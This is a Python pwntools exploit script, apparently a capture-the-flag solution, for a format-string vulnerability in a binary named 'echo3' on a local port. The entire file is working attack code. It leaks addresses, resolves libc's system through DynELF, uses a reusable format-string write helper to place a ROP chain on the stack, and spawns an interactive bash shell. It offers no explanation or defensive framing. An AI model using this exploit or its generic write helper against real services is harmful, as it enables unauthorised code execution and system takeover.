#!/usr/bin/python
# -*- coding: utf-8 -*-
from pwn import *
import os
import time
import struct


class StrFmt:

    def __init__(self, strfmt_position, arch=0x8, already_printed=0, pad_char='\x00', granularity=1, nbytes=None):
        self.strfmt_position = strfmt_position
        self.arch = arch
        self.already_printed = already_printed
        self.pad_char = pad_char
        self.granularity = granularity
        self.nbytes = nbytes or arch
        self.pX = lambda v: (struct.pack('<I', v) if self.arch == 4 else struct.pack('<Q', v))

    def write(self, addr, value, granularity=None, nbytes=None, pad_char=None):
        granularity = granularity or self.granularity
        nbytes = nbytes or self.nbytes
        pad_char = pad_char or self.pad_char

        currently_written = self.already_printed
        len_modifier = {1: 'hhn', 2: 'hn', self.arch: 'n'}[granularity]

        list = []
        for i in range(nbytes / granularity):
            caddr = addr + i * granularity
            cval = (value >> 0x8 * i * granularity) % 256 ** granularity
            n = cval - currently_written
            while n < 0:
                n += 256 ** granularity
            adjustfmt = ('%0{}c'.format(n) if n > 0 else '')

            expected_max_len = -len(adjustfmt) % self.arch - self.arch
            current_len = expected_max_len + 1
            while expected_max_len < current_len:
                expected_max_len += self.arch
                writefmt = '%{}${}'.format(self.strfmt_position
                        + (expected_max_len + len(adjustfmt))
                        / self.arch, len_modifier)
                current_len = len(writefmt)

            padding = pad_char * (-(len(writefmt) + len(adjustfmt))% self.arch)
            list.append(adjustfmt + writefmt + padding + self.pX(caddr))
        return list


def get(addr):
    p.readuntil('Username>')
    p.send_raw('%11$s__\x00' + p64(addr) + '\n')
    data = p.readuntil('__', drop=True)
    p.recv(timeout=1)
    if len(data) == 0:
        data = '\x00'
    p.send_raw(repeatfmt)
    return data


def next_step(base=None, step=None):
    next_step.current = base or next_step.current
    next_step.step = step or next_step.step
    current = next_step.current
    next_step.current += next_step.step
    return current


context.log_level = logging.ERROR
elf = ELF('./echo3')

# env={"LD_LIBRARY_PATH":os.getcwd()}
# p=process("./echo3", aslr=True)

p = remote('localhost', 4446)
p.recv()
p.sendline('%16$p|%17$p__')
addresses = [int(x, 16) for x in p.readuntil('__', drop=True).split('|')]

authretptr = addresses[0] - 0x18
mainretptr = addresses[0] + 0x8
log.log(message='authretptr: {:#x}'.format(authretptr), level=555)
log.log(message='mainretptr: {:#x}'.format(mainretptr), level=555)

original_authretaddr = addresses[1]
pbase = original_authretaddr - 0x985
call_authenticated_user = pbase + 0x980
log.log(message='echo3 base address: {:#x}'.format(pbase), level=555)

strfmt = StrFmt(6)
repeatfmt = strfmt.write(addr=authretptr,
                         value=call_authenticated_user, granularity=2,
                         nbytes=2)[0]
p.send_raw(repeatfmt)

prog = log.progress(message='Locating the first environmental variable', level=555)
d = DynELF(get, pbase, elf)
environ = d.lookup('environ', 'libc')
envptr = u64(get(environ).ljust(0x8, '\x00'))
firstenvptr = u64(get(envptr).ljust(0x8, '\x00'))
buf = firstenvptr
prog.success('{:#x} : Done'.format(firstenvptr))

pr_1rdi = pbase + 0xa13

write_dict = {
    next_step(mainretptr, 0x8): pr_1rdi,
    next_step(): buf,
    next_step(): d.lookup('system', 'libc'),
    next_step(): pr_1rdi,
    next_step(): {'value': 0, 'granularity': 0x8},
    next_step(): d.lookup('exit', 'libc'),
}

write_str = 'bash\x00'
log.log(message='String to be added onto stack: {}'.format(write_str), level=555)
for i in range(0, len(write_str), 0x8):
    write_dict[buf + i] = int(write_str[i:i + 0x8][::-1].encode('hex'), 16)

prog = log.progress('Performing the memory writes', level=555)
strfmt2 = StrFmt(10)
for (addr, vd) in write_dict.iteritems():
    if not isinstance(vd, dict): vd = {'value': vd}
    fmt_list = strfmt2.write(addr, **vd)
    for i in range(len(fmt_list)):
        p.readuntil('Username>')
        cfmt = fmt_list[i]
        if len(cfmt) > 0x18:
            error('Format string len error {addr} {i}'.format(addr=addr, i=i))
        cfmt.ljust(0x18, '\n')
        p.send_raw(cfmt)
        p.send_raw(repeatfmt)
prog.success()

prog = log.progress('Restoring the original return address of authenticated_user', level=555)
p.readuntil('Username>')
fmt = strfmt.write(addr=authretptr, value=original_authretaddr, granularity=2, nbytes=2)[0]
p.send_raw(fmt)
prog.success()

prog = log.progress('Waiting for the shell', level=555)
p.sendline('Gimme da shell')
p.readuntil('shell')
prog.success()

p.interactive()
